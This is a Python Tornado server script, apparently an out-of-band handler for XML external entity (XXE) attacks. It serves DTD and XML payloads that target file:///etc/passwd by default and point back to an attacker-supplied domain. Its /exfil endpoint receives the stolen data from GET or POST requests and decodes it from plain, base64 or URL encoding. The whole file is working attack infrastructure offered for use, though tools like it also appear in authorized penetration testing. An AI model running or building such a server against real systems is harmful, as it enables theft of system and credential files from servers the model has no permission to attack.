#!/usr/bin/env python3
import argparse
import sys
from base64 import b64decode
from urllib.parse import unquote_plus as urldecode

import tornado.ioloop as ioloop
from tornado.web import Application, RequestHandler


class MyRequestHandler(RequestHandler):
    """Base class for all request handlers"""

    def initialize(self, hostname):
        self.hostname = hostname
        self.post = self.get

class PayloadDTDQueryHandler(MyRequestHandler):
    """Generates DTD payload to exfiltrate `entity`"""

    def get(self):
        entity = self.get_query_argument('entity', 'file:///etc/passwd', False)

        self.render('net.query.dtd', **{
            "entity": entity,
            "hostname": self.hostname
        })

class PayloadVanialaQueryHandler(MyRequestHandler):
    """Generates vanilla XXE payload which exfiltrates `entity`"""

    def get(self):
        entity = self.get_query_argument('entity', 'file:///etc/passwd', False)

        self.render('payload.xml', **{
            "hostname": self.hostname,
            "entity": entity
        })

class ExfiltrateHandler(MyRequestHandler):
    """Exfiltrates data from GET / POST requests. Supports multiple popular decoders"""

    decoders = {
        'plain': lambda x: x,
        'b64': b64decode,
        'b64u': lambda x: b64decode(urldecode(x.decode())),
        'url': lambda x: urldecode(x.decode())
    }

    def write_decoded(self, decoder, payload):
        decode = self.decoders.get(
            decoder,
            self.decoders['url']
        )
        decoded_payload = decode(payload)
        
        assert(type(decoded_payload) in [str, bytes])

        if type(decoded_payload) == bytes:
            sys.stdout.buffer.write(decoded_payload)
        else:
            sys.stdout.write(decoded_payload)

    def get(self, oob_type):
        decoder = self.get_query_argument('decoder', 'url')

        sys.stdout.write("=" * 10 + '\n')

        if oob_type == "query":
            data = self.get_query_argument('data', None, strip=False).encode()
        elif oob_type == "post":
            data = self.request.body

        if data is not None:
            self.write_decoded(decoder, data)
        else:
            sys.stdout.write(
                """Warning: No `data` query parameter"""
            )

        sys.stdout.write('\n' + "=" * 10 + '\n')

        self.write("OK")

class HelpHandler(RequestHandler):

    def initialize(self, routes, hostname):
        self.routes = routes
        self.hostname = hostname

    def get(self):
        self.render('help.msg', **{
            "hostname": self.hostname,
            "routes": self.routes
        })


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        sys.argv[0],
        formatter_class=argparse.RawTextHelpFormatter,
        description="OOB handler"
    )

    parser.add_argument('-p', '--port', type=int, required=False, default=31337,
                        help="Port to listen on")
    parser.add_argument('-d', '--domain', type=str, required=True,
                        help="Domain name to use in payloads. Specify protocol and port if it isn't default")

    args = parser.parse_args()
    routes = [
        (r'/dtd', PayloadDTDQueryHandler, dict(hostname=args.domain)),
        (r'/payload', PayloadVanialaQueryHandler, dict(hostname=args.domain)),
        (r'/exfil/(.*)', ExfiltrateHandler, dict(hostname=args.domain))
    ]

    app = Application(routes, template_path='templates')
    app.add_handlers(r'.*', [
        (r'/help', HelpHandler, dict(hostname=args.domain, routes=routes))
    ])

    app.listen(args.port)
    ioloop.IOLoop.current().start()
